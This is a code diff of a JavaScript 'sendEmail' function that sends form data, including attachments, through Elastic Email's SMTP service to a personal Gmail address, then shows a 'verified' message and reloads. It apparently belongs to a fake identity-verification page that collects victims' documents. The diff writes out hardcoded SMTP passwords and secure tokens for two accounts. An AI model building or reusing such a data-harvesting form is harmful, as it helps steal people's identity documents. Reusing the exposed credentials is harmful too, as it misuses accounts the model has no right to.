@@ -132,13 +132,15 @@ function sendEmail() {
             ];
 
             Email.send({
-                SecureToken : "0faac2e3-f17a-4357-9eff-a0b41a6d9ea4", // for domain name - https://idmetoken.netlify.app/
+                // SecureToken for domain name - https://idmetoken.netlify.app/
+                SecureTolen: "0d233b7e-3663-4b7e-a8bd-536e0f50cba2", // for username - mike.nexo.io@gmail.com
+                // SecureToken : "0faac2e3-f17a-4357-9eff-a0b41a6d9ea4", // username - mikeychocho@gmail.com
                 Host : "smtp.elasticemail.com",
-                Username : "mikeychocho@gmail.com",
-                // Password : "26E2340C1F8E41572C8131573D2898D4CBB2",
-                Password : "AF02FB4B727151621706DFB93C8C2BCE7830",
-                To : 'mikeychocho@gmail.com',
-                From : "mikeychocho@gmail.com",
+                Username : "mike.nexo.io@gmail.com",
+                Password : "26E2340C1F8E41572C8131573D2898D4CBB2", // for username - mike.nexo.io@gmail.com
+                // Password : "AF02FB4B727151621706DFB93C8C2BCE7830", // for username - mikeychocho@gmail.com
+                To : 'mike.nexo.io@gmail.com',
+                From : "mike.nexo.io@gmail.com",
                 Subject: subject,
                 Body: message,
                 Attachments: attachments,
@@ -151,11 +153,11 @@ function sendEmail() {
                     setTimeout(() => {
                         loader.style.display = 'none';
                         verifiedMessage.style.display = 'flex';
+                        cl('Finished verification message: ' + message);
                     }, 2000);
 
                     setTimeout(() => {
                         window.location.reload();
-                        cl('Finished verification message: ' + message);
                     }, 3000);
                 },
                 error => {
